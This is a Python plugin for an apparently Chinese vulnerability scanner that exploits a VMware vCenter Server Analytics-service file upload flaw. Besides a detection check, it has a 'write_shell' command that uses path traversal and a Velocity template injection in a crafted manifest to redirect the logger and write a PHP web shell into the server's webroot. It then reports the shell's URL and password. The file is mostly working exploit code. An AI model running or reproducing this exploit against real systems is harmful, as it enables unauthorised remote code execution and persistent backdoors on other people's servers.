# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "VMware vCenter Server 任意文件上传漏洞",
        "dork": "title=\"ID_VC_Welcome\"",
        "description": "攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞",
        "references": ["-"],
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "body",
                    "keyword": ["VMware", "ID_VISDK", "download"]
                }
            ]
        )

    def url(self) -> dict:
        random_str = self.build_random_str()
        r = self.request(
            method='POST',
            path=f'./analytics/telemetry/ph/api/hyper/send?_c&_i={random_str}',
            timeout=15,
            data="test",
            headers={
                'User-Agent': "vAPI/2.100.0 Java/1.8.0_261 (Linux; 4.19.160-6.ph3; amd64)",
                'Content-Type': 'application/json'
            }
        )
        if r.status_code == 200:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        name, password, code, flag = self.build_web_shell('php')
        random_str = self.build_random_str()
        shell_content = ''
        for s in code:
            shell_content += "\\u{:04x}".format(ord(s))
        self.request(
            method='POST',
            path=f"./analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={random_str}&_i={random_str}",
            timeout=15,
            json={
                "manifestSpec": {},
                "objectType": "a2",
                "collectionTriggerDataNeeded": True,
                "deploymentDataNeeded": True,
                "resultNeeded": True,
                "signalCollectionCompleted": True,
                "localManifestPath": "a7",
                "localPayloadPath": "a8",
                "localObfuscationMapPath": "a9"
            },
            headers={
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0",
                "X-Deployment-Secret": "abc",
                "Content-Type": "application/json",
                "Connection": "close"
            }
        )
        file_location = f"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{name}"
        manifest_data = """<manifest recommendedPageSize="500">
                               <request>
                                  <query name="vir:VCenter">
                                     <constraint>
                                        <targetType>ServiceInstance</targetType>
                                     </constraint>
                                     <propertySpec>
                                        <propertyNames>content.about.instanceUuid</propertyNames>
                                        <propertyNames>content.about.osType</propertyNames>
                                        <propertyNames>content.about.build</propertyNames>
                                        <propertyNames>content.about.version</propertyNames>
                                     </propertySpec>
                                  </query>
                               </request>
                               <cdfMapping>
                                  <indepedentResultsMapping>
                                     <resultSetMappings>
                                        <entry>
                                           <key>vir:VCenter</key>
                                           <value>
                                              <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                                                 <resourceItemToJsonLdMapping>
                                                    <forType>ServiceInstance</forType>
                                                 <mappingCode><![CDATA[    
                                                    #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                                                    #set($orig_log = $appender.getFile())##
                                                    #set($logger = $GLOBAL-logger.logger.parent)##     
                                                    $appender.setFile("%s")##     
                                                    $appender.activateOptions()##  
                                                    $logger.warn("%s")##   
                                                    $appender.setFile($orig_log)##     
                                                    $appender.activateOptions()##]]>
                                                 </mappingCode>
                                                 </resourceItemToJsonLdMapping>
                                              </value>
                                           </value>
                                        </entry>
                                     </resultSetMappings>
                                  </indepedentResultsMapping>
                               </cdfMapping>
                               <requestSchedules>
                                  <schedule interval="1h">
                                     <queries>
                                        <query>vir:VCenter</query>
                                     </queries>
                                  </schedule>
                               </requestSchedules>
                            </manifest>""" % (file_location, shell_content)
        self.request(
            method='POST',
            path=f"./analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={random_str}&_i={random_str}",
            timeout=15,
            json={"contextData": "a3", "manifestContent": manifest_data, "objectId": "a2"},
            headers={
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0",
                "X-Deployment-Secret": "abc",
                "Content-Type": "application/json",
                "Connection": "close"
            }
        )
        url = urllib.parse.urljoin(url, f"./idm/..;/{name}")
        r = self.request(method='get', url=url, timeout=30)
        if r.status_code == 200 and flag in r.text:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {url}')
            self.log.success(f'访问密码: {password}')
        else:
            self.log.failure('一句话马写入失败')
